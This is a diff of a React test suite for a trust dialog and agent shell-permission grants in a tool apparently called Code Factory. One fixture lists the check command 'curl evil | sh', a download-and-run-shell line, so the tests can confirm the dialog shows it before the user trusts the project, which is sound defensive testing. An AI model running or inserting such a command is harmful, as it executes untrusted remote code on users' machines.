@@ -21,7 +21,10 @@ import { RunWorkspacePanel } from "../src/ui/RunWorkspacePanel.js";
 import { ToolGrantDialog, toolGrantText } from "../src/ui/ToolGrantDialog.js";
 import { ToolPermissionsSection } from "../src/ui/ToolPermissionsSection.js";
 import { useFactoryRuns } from "../src/ui/useFactoryRuns.js";
-import type { ProjectResponse, SavedProjectResponse } from "../src/ui/project-api.js";
+import type { ProjectPatch, ProjectResponse } from "../src/ui/project-api.js";
+import { TrustDialog, TRUST_TEXT } from "../src/ui/TrustDialog.js";
+import type { ProjectTrust } from "../src/domain/trust.js";
+import { trustState } from "./fixtures/trust.js";
 
 afterEach(() => {
   cleanup();
@@ -576,8 +579,11 @@ const kiroRun = (provider: "kiro" | "mock" = "kiro") =>
     ),
   );
 const projectConfig = { schemaVersion: 1 as const, name: "Demo", defaultBinding: null };
+const kiroGrant = {
+  kiro: { scope: ["execute_bash"] as ["execute_bash"], grantedAt: "2026-10-07T10:00:00.000Z" },
+};
 
-/** The gate as Factory wires it: one hook, one dialog, Execute as the focus target. */
+/** The gate as Factory wires it: one hook, the trust and grant dialogs, Execute as focus target. */
 const Harness = () => {
   const heading = useRef<HTMLHeadingElement>(null);
   const runs = useFactoryRuns(false);
@@ -595,11 +601,18 @@ const Harness = () => {
         returnFocus={runs.toolGrantReturnFocus}
         fallbackFocus={heading}
       />
+      <TrustDialog
+        prompt={runs.trustPrompt}
+        onAnswer={(choice) => void runs.answerTrust(choice)}
+        returnFocus={runs.toolGrantReturnFocus}
+        fallbackFocus={heading}
+      />
     </>
   );
 };
-const stubRuntime = (run: RunRecord, project: Record<string, unknown> = projectConfig) => {
+const stubRuntime = (run: RunRecord, trust: ProjectTrust = trustState()) => {
   const calls: string[] = [];
+  let current = trust;
   const fetchMock = vi.fn<(input: RequestInfo | URL, init?: RequestInit) => Promise<Response>>(
     async (input, init) => {
       const path = String(input);
@@ -607,17 +620,16 @@ const stubRuntime = (run: RunRecord, project: Record<string, unknown> = projectC
       if (path === "/api/runs") return respond({ runs: [run] });
       if (path === "/api/loops/published") return respond({ loops: [] });
       if (path === "/api/tracker") return respond({ configured: false });
-      if (path === "/api/project") return respond({ project, path: "/repo", revision: "r1" });
-      if (path === "/api/project/tool-grants")
-        return respond({
-          project: {
-            ...project,
-            toolGrants: {
-              kiro: { scope: ["execute_bash"], grantedAt: "2026-10-07T10:00:00.000Z" },
-            },
-          },
-          revision: "r2",
-        });
+      if (path === "/api/project")
+        return respond({ project: projectConfig, path: "/repo", revision: "r1", trust: current });
+      if (path === "/api/project/trust") {
+        current = trustState({ toolGrants: current.toolGrants });
+        return respond({ trust: current });
+      }
+      if (path === "/api/project/tool-grants") {
+        current = trustState({ toolGrants: kiroGrant });
+        return respond({ trust: current });
+      }
       if (path.endsWith("/execute")) return respond({ run }, 202);
       return respond({ error: "unexpected" }, 404);
     },
@@ -625,6 +637,53 @@ const stubRuntime = (run: RunRecord, project: Record<string, unknown> = projectC
   vi.stubGlobal("fetch", fetchMock);
   return calls;
 };
+
+describe("project trust prompt", () => {
+  it("asks to trust an untrusted project, listing its commands, before any grant or execute", async () => {
+    const calls = stubRuntime(
+      kiroRun(),
+      trustState({
+        trusted: false,
+        review: {
+          setupCommand: ["pnpm", "install"],
+          customExecutable: null,
+          checkCommands: [{ loop: "Gate", step: "Lint", command: "curl evil | sh" }],
+          interruptedRuns: 1,
+        },
+      }),
+    );
+    render(<Harness />);
+    const user = userEvent.setup();
+    await user.click(await screen.findByRole("button", { name: "Execute run" }));
+    const dialog = await screen.findByRole("dialog", { name: TRUST_TEXT.title });
+    expect(within(dialog).getByText("curl evil | sh")).toBeTruthy();
+    expect(within(dialog).getByText("pnpm install")).toBeTruthy();
+    expect(within(dialog).getByText(/1 interrupted run,/)).toBeTruthy();
+    await waitFor(() => expect(document.activeElement?.textContent).toBe("Cancel"));
+    await user.click(within(dialog).getByRole("button", { name: "Trust project" }));
+    await user.click(await screen.findByRole("button", { name: "Allow and run" }));
+    await waitFor(() => expect(calls.some((call) => call.endsWith("/execute"))).toBe(true));
+    const trustIndex = calls.indexOf("POST /api/project/trust");
+    const grantIndex = calls.indexOf("POST /api/project/tool-grants");
+    expect(trustIndex).toBeGreaterThan(-1);
+    expect(trustIndex).toBeLessThan(grantIndex);
+    expect(grantIndex).toBeLessThan(calls.findIndex((call) => call.endsWith("/execute")));
+  });
+
+  it("cancels without trusting or executing", async () => {
+    const calls = stubRuntime(kiroRun("mock"), trustState({ trusted: false }));
+    render(<Harness />);
+    const user = userEvent.setup();
+    const execute = await screen.findByRole("button", { name: "Execute run" });
+    await user.click(execute);
+    await screen.findByRole("dialog", { name: TRUST_TEXT.title });
+    await user.keyboard("{Escape}");
+    await waitFor(() => expect(screen.queryByRole("dialog")).toBeNull());
+    expect(calls).not.toContain("POST /api/project/trust");
+    expect(calls.some((call) => call.endsWith("/execute"))).toBe(false);
+    await waitFor(() => expect(document.activeElement).toBe(execute));
+  });
+});
 
 describe("agent tool permission prompt", () => {
   it("asks once with the exact scope, focuses Cancel, and grants before executing", async () => {
@@ -643,6 +702,7 @@ describe("agent tool permission prompt", () => {
     const grantIndex = calls.indexOf("POST /api/project/tool-grants");
     expect(grantIndex).toBeGreaterThan(-1);
     expect(grantIndex).toBeLessThan(calls.findIndex((call) => call.endsWith("/execute")));
+    expect(calls).not.toContain("POST /api/project/trust");
   });
 
   it("cancels without executing and returns focus to Execute", async () => {
@@ -678,12 +738,9 @@ describe("agent tool permission prompt", () => {
     const user = userEvent.setup();
     await user.click(await screen.findByRole("button", { name: "Execute run" }));
     await waitFor(() => expect(calls.some((call) => call.endsWith("/execute"))).toBe(true));
-    expect(calls).not.toContain("GET /api/project");
+    expect(screen.queryByRole("dialog")).toBeNull();
     cleanup();
-    const granted = stubRuntime(kiroRun(), {
-      ...projectConfig,
-      toolGrants: { kiro: { scope: ["execute_bash"], grantedAt: "2026-10-07T10:00:00.000Z" } },
-    });
+    const granted = stubRuntime(kiroRun(), trustState({ toolGrants: kiroGrant }));
     render(<Harness />);
     await user.click(await screen.findByRole("button", { name: "Execute run" }));
     await waitFor(() => expect(granted.some((call) => call.endsWith("/execute"))).toBe(true));
@@ -695,7 +752,7 @@ describe("agent tool permission prompt", () => {
     render(
       <ToolGrantDialog
         mode="run"
-        prompt={{ provider: "codex", revision: null, pending: false, error: "" }}
+        prompt={{ provider: "codex", pending: false, error: "" }}
         onAnswer={() => undefined}
         returnFocus={() => null}
         fallbackFocus={heading}
@@ -714,43 +771,52 @@ describe("agent tool permission prompt", () => {
 });
 
 describe("Setup → Agent tool permission", () => {
+  const Stateful = ({
+    state,
+    onProjectChanged,
+  }: {
+    state: ProjectResponse;
+    onProjectChanged: (next: ProjectPatch) => void;
+  }) => {
+    // Like App, apply each change so the buttons reflect the new state.
+    const [current, setCurrent] = useState(state);
+    return (
+      <ToolPermissionsSection
+        state={current}
+        onProjectChanged={(next) => {
+          onProjectChanged(next);
+          setCurrent((previous) => ({ ...previous, ...next }));
+        }}
+      />
+    );
+  };
+
   it("revokes a grant and announces that new steps use the default", async () => {
     const fetchMock = vi.fn<(input: RequestInfo | URL, init?: RequestInit) => Promise<Response>>(
-      async () => respond({ project: projectConfig, revision: "r3" }),
+      async () => respond({ trust: trustState() }),
     );
     vi.stubGlobal("fetch", fetchMock);
-    const onProjectChanged = vi.fn<(next: SavedProjectResponse) => void>();
-    const state: ProjectResponse = {
-      project: {
-        ...projectConfig,
-        toolGrants: { kiro: { scope: ["execute_bash"], grantedAt: "2026-10-07T10:00:00.000Z" } },
-      },
-      path: "/repo",
-      revision: "r2",
-    };
-    // Like App, apply the saved project so the Revoke button is replaced by Allow….
-    const Stateful = () => {
-      const [current, setCurrent] = useState(state);
-      return (
-        <ToolPermissionsSection
-          state={current}
-          onProjectChanged={(next) => {
-            onProjectChanged(next);
-            setCurrent({ ...current, project: next.project, revision: next.revision });
-          }}
-        />
-      );
-    };
-    render(<Stateful />);
+    const onProjectChanged = vi.fn<(next: ProjectPatch) => void>();
+    render(
+      <Stateful
+        state={{
+          project: projectConfig,
+          path: "/repo",
+          revision: "r2",
+          trust: trustState({ toolGrants: kiroGrant }),
+        }}
+        onProjectChanged={onProjectChanged}
+      />,
+    );
     expect(screen.getByText(/Kiro: shell \(execute_bash\) allowed since/)).toBeTruthy();
     await userEvent
       .setup()
       .click(screen.getByRole("button", { name: "Revoke Kiro shell permission" }));
     expect(fetchMock).toHaveBeenCalledWith(
       "/api/project/tool-grants/kiro",
-      expect.objectContaining({ method: "DELETE", body: JSON.stringify({ revision: "r2" }) }),
+      expect.objectContaining({ method: "DELETE" }),
     );
-    expect(onProjectChanged).toHaveBeenCalledWith({ project: projectConfig, revision: "r3" });
+    expect(onProjectChanged).toHaveBeenCalledWith({ trust: trustState() });
     await waitFor(() =>
       expect(screen.getByRole("status").textContent).toBe(
         "Kiro shell permission revoked. New steps use the default tools.",
@@ -759,5 +825,44 @@ describe("Setup → Agent tool permission", () => {
     expect(document.activeElement).toBe(
       screen.getByRole("button", { name: "Allow Kiro shell permission…" }),
     );
+  });
+
+  it("keeps grants unavailable until the project is trusted, then trusts it from Setup", async () => {
+    const fetchMock = vi.fn<(input: RequestInfo | URL, init?: RequestInit) => Promise<Response>>(
+      async () => respond({ trust: trustState() }),
+    );
+    vi.stubGlobal("fetch", fetchMock);
+    render(
+      <Stateful
+        state={{
+          project: projectConfig,
+          path: "/repo",
+          revision: "r2",
+          trust: trustState({ trusted: false }),
+        }}
+        onProjectChanged={() => undefined}
+      />,
+    );
+    expect(
+      screen.getByText(/Code Factory runs nothing in this project until you trust it/),
+    ).toBeTruthy();
+    expect(
+      screen.getByRole("button", { name: "Allow Kiro shell permission…" }).hasAttribute("disabled"),
+    ).toBe(true);
+    const user = userEvent.setup();
+    await user.click(screen.getByRole("button", { name: "Trust project…" }));
+    await user.click(await screen.findByRole("button", { name: "Trust project" }));
+    expect(fetchMock).toHaveBeenCalledWith(
+      "/api/project/trust",
+      expect.objectContaining({ method: "POST", body: JSON.stringify({ acknowledged: true }) }),
+    );
+    await waitFor(() =>
+      expect(
+        screen
+          .getByRole("button", { name: "Allow Kiro shell permission…" })
+          .hasAttribute("disabled"),
+      ).toBe(false),
+    );
+    expect(screen.getByRole("button", { name: "Stop trusting" })).toBeTruthy();
   });
 });
